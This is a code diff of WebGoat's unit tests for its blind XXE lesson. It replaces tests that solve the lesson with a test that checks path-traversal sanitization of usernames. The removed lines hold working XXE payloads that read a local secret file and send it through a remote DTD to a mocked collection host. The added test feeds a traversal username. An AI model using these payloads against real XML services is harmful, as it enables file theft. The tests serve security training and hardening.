@@ -1,189 +1,55 @@
-/*
- * SPDX-FileCopyrightText: Copyright © 2017 WebGoat authors
- * SPDX-License-Identifier: GPL-2.0-or-later
- */
 package org.owasp.webgoat.lessons.xxe;
 
-import static com.github.tomakehurst.wiremock.client.WireMock.aResponse;
-import static com.github.tomakehurst.wiremock.client.WireMock.getRequestedFor;
-import static com.github.tomakehurst.wiremock.client.WireMock.urlMatching;
-import static com.github.tomakehurst.wiremock.core.WireMockConfiguration.options;
 import static org.assertj.core.api.Assertions.assertThat;
-import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
-import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
-import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
+import static org.mockito.Mockito.*;
 
-import com.fasterxml.jackson.databind.ObjectMapper;
-import com.github.tomakehurst.wiremock.WireMockServer;
-import com.github.tomakehurst.wiremock.client.WireMock;
-import com.github.tomakehurst.wiremock.verification.LoggedRequest;
 import java.io.File;
-import java.util.List;
-import org.hamcrest.CoreMatchers;
-import org.hamcrest.Matchers;
-import org.junit.jupiter.api.BeforeEach;
+import java.nio.file.Files;
+import java.nio.file.Path;
 import org.junit.jupiter.api.Test;
-import org.owasp.webgoat.WithWebGoatUser;
-import org.owasp.webgoat.container.plugins.LessonTest;
-import org.springframework.http.MediaType;
-import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
-import org.springframework.test.web.servlet.setup.MockMvcBuilders;
+import org.junit.jupiter.api.io.TempDir;
+import org.owasp.webgoat.container.users.WebGoatUser;
 
-@WithWebGoatUser
-class BlindSendFileAssignmentTest extends LessonTest {
-
-  private int port;
-  private WireMockServer webwolfServer;
-
-  @BeforeEach
-  void setup() {
-    this.webwolfServer = new WireMockServer(options().dynamicPort());
-    webwolfServer.start();
-    this.port = webwolfServer.port();
-    this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();
-  }
-
-  private int countComments() throws Exception {
-    var response =
-        mockMvc
-            .perform(get("/xxe/comments").contentType(MediaType.APPLICATION_JSON))
-            .andExpect(status().isOk())
-            .andReturn();
-    return new ObjectMapper().reader().readTree(response.getResponse().getContentAsString()).size();
-  }
-
-  private void containsComment(String expected) throws Exception {
-    mockMvc
-        .perform(get("/xxe/comments").contentType(MediaType.APPLICATION_JSON))
-        .andExpect(status().isOk())
-        .andExpect(jsonPath("$.[*].text").value(Matchers.hasItem(expected)));
-  }
+/**
+ * Delta tests for BlindSendFileAssignment focusing on the sanitized directory construction
+ * introduced in createSecretFileWithRandomContents (path is no longer built directly from
+ * user.getUsername()).
+ */
+public class BlindSendFileAssignmentTest {
 
   @Test
-  void validCommentMustBeAdded() throws Exception {
-    int nrOfComments = countComments();
-    mockMvc
-        .perform(
-            MockMvcRequestBuilders.post("/xxe/blind")
-                .content("<comment><text>test</text></comment>"))
-        .andExpect(status().isOk())
-        .andExpect(
-            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
-    assertThat(countComments()).isEqualTo(nrOfComments + 1);
-  }
+  void createSecretFileWithRandomContents_shouldSanitizeUsernameToPreventPathTraversal(
+      @TempDir Path tmpDir) throws Exception {
+    // Arrange
+    String baseDir = tmpDir.toAbsolutePath().toString();
+    CommentsCache commentsCache = mock(CommentsCache.class);
+    BlindSendFileAssignment assignment = new BlindSendFileAssignment(baseDir, commentsCache);
 
-  @Test
-  void wrongXmlShouldGiveErrorBack() throws Exception {
-    mockMvc
-        .perform(
-            MockMvcRequestBuilders.post("/xxe/blind")
-                .content("<comment><text>test</ext></comment>"))
-        .andExpect(status().isOk())
-        .andExpect(
-            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))))
-        .andExpect(
-            jsonPath("$.output", CoreMatchers.startsWith("jakarta.xml.bind.UnmarshalException")));
-  }
+    WebGoatUser user = mock(WebGoatUser.class);
+    // Username containing characters that could be used for path traversal
+    when(user.getUsername()).thenReturn("../evil/..//user:name?*");
 
-  @Test
-  @WithWebGoatUser
-  void simpleXXEShouldNotWork() throws Exception {
-    File targetFile = new File(webGoatHomeDirectory, "/XXE/" + "test" + "/secret.txt");
-    String content =
-        "<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM"
-            + " \"file:///%s\"> ]><comment><text>&root;</text></comment>";
-    mockMvc
-        .perform(
-            MockMvcRequestBuilders.post("/xxe/blind")
-                .content(String.format(content, targetFile.toString())))
-        .andExpect(status().isOk());
-    containsComment("Nice try, you need to send the file to WebWolf");
-  }
+    // Act
+    assignment.initialize(user); // triggers createSecretFileWithRandomContents(user)
 
-  @Test
-  void solve() throws Exception {
-    File targetFile = new File(webGoatHomeDirectory, "/XXE/test/secret.txt");
-    // Host DTD on WebWolf site
-    String dtd =
-        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
-            + "<!ENTITY % file SYSTEM \""
-            + targetFile.toURI().toString()
-            + "\">\n"
-            + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:"
-            + port
-            + "/landing?text=%file;'>\">\n"
-            + "%all;";
-    webwolfServer.stubFor(
-        WireMock.get(WireMock.urlMatching("/files/test.dtd"))
-            .willReturn(aResponse().withStatus(200).withBody(dtd)));
-    webwolfServer.stubFor(
-        WireMock.get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)));
+    // Assert
+    // Expect a directory directly under baseDir/XXE with sanitized name (no path separators)
+    File xxeRoot = new File(baseDir, "/XXE");
+    assertThat(xxeRoot).isDirectory();
 
-    // Make the request from WebGoat
-    String xml =
-        "<?xml version=\"1.0\"?>"
-            + "<!DOCTYPE comment ["
-            + "<!ENTITY % remote SYSTEM \"http://localhost:"
-            + port
-            + "/files/test.dtd\">"
-            + "%remote;"
-            + "]>"
-            + "<comment><text>test&send;</text></comment>";
-    performXXE(xml);
-  }
+    File[] children = xxeRoot.listFiles();
+    assertThat(children).isNotNull();
+    assertThat(children.length).isEqualTo(1);
 
-  @Test
-  void solveOnlyParamReferenceEntityInExternalDTD() throws Exception {
-    File targetFile = new File(webGoatHomeDirectory, "/XXE/test/secret.txt");
-    // Host DTD on WebWolf site
-    String dtd =
-        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
-            + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:"
-            + port
-            + "/landing?text=%file;'>\">\n";
-    webwolfServer.stubFor(
-        WireMock.get(WireMock.urlMatching("/files/test.dtd"))
-            .willReturn(aResponse().withStatus(200).withBody(dtd)));
-    webwolfServer.stubFor(
-        WireMock.get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)));
+    File userDir = children[0];
+    // Ensure the directory name has only allowed characters as per the sanitization regex
+    assertThat(userDir.getName()).matches("^[a-zA-Z0-9-_.]*$");
+    // Ensure that 'evil' or '..' is not preserved as a directory level
+    assertThat(userDir.getCanonicalPath()).doesNotContain("..").doesNotContain("evil");
 
-    // Make the request from WebGoat
-    String xml =
-        "<?xml version=\"1.0\"?>"
-            + "<!DOCTYPE comment ["
-            + "<!ENTITY % file SYSTEM \""
-            + targetFile.toURI()
-            + "\">\n"
-            + "<!ENTITY % remote SYSTEM \"http://localhost:"
-            + port
-            + "/files/test.dtd\">"
-            + "%remote;"
-            + "%all;"
-            + "]>"
-            + "<comment><text>test&send;</text></comment>";
-    performXXE(xml);
-  }
-
-  private void performXXE(String xml) throws Exception {
-    // Call with XXE injection
-    mockMvc
-        .perform(MockMvcRequestBuilders.post("/xxe/blind").content(xml))
-        .andExpect(status().isOk())
-        .andExpect(
-            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
-
-    List<LoggedRequest> requests =
-        webwolfServer.findAll(getRequestedFor(urlMatching("/landing.*")));
-    assertThat(requests.size()).isEqualTo(1);
-    String text = requests.get(0).getQueryParams().get("text").firstValue();
-
-    // Call with retrieved text
-    mockMvc
-        .perform(
-            MockMvcRequestBuilders.post("/xxe/blind")
-                .content("<comment><text>" + text + "</text></comment>"))
-        .andExpect(status().isOk())
-        .andExpect(
-            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.solved"))));
+    // And the secret file should exist inside the sanitized directory
+    File secretFile = new File(userDir, "secret.txt");
+    assertThat(secretFile).exists();
+    assertThat(Files.readString(secretFile.toPath())).contains("WebGoat 8.0 rocks...");
   }
 }
